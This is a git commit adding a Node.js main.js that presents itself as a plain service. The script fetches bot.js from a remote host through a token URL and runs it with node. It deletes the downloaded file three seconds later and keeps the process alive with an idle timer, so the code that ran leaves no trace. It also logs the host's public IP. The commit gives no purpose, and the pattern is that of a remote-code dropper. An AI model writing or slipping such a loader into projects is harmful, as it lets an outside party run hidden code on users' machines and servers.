417b8921e3c5c349aa944d57f6c77025d7fbe48f
kuisa <32757027+kuisa@users.noreply.github.com>
2026-09-16 23:40:21 +0800

    Add files via upload

---
+++ main.js
@@ -0,0 +1,78 @@
+const https = require("https");
+const fs = require("fs");
+const { spawn } = require("child_process");
+
+const TOKEN = "";
+const BOT_URL = `https://netjett-de.kof95zip.pp.ua/jsbot/cfws/bot.php?token=${TOKEN}`;
+const BOT_FILE = "./bot.js";
+
+
+function getPublicIP() {
+    return new Promise((resolve, reject) => {
+        https.get("https://api.ipify.org?format=json", (res) => {
+            let data = "";
+            res.on("data", chunk => {
+                data += chunk;
+            });
+            res.on("end", () => {
+                try {
+                    const json = JSON.parse(data);
+                    resolve(json.ip);
+                } catch (err) {
+                    reject(err);
+                }
+            });
+        }).on("error", err => {
+            reject(err);
+        });
+    });
+}
+
+function download(url, filename) {
+    return new Promise((resolve, reject) => {
+        const file = fs.createWriteStream(filename);
+        https.get(url, (res) => {
+            if (res.statusCode !== 200) {
+                reject(new Error("Download Fail: " + res.statusCode));
+                return;
+            }
+            res.pipe(file);
+            file.on("finish", () => {
+                file.close();
+                resolve();
+            });
+        }).on("error", (err) => {
+            fs.unlink(filename, () => {});
+            reject(err);
+        });
+    });
+}
+
+async function startBot() {
+    try {
+        try {
+            const ip = await getPublicIP();
+            console.log("My IP:", ip);
+        } catch (e) {
+            console.log("Get IP Failed:", e.message);
+        }
+        await download(BOT_URL, BOT_FILE);
+        const bot = spawn("node", [BOT_FILE], {
+            stdio: "inherit"
+        });
+        setTimeout(() => {
+            if (fs.existsSync(BOT_FILE)) {
+                fs.unlinkSync(BOT_FILE);
+            }
+        }, 3000);
+        bot.on("exit", (code) => {});
+    } catch (err) {
+        console.error("Error:", err.message);
+    }
+}
+
+startBot();
+
+console.log("Service Running....");
+
+setInterval(() => {}, 60000);
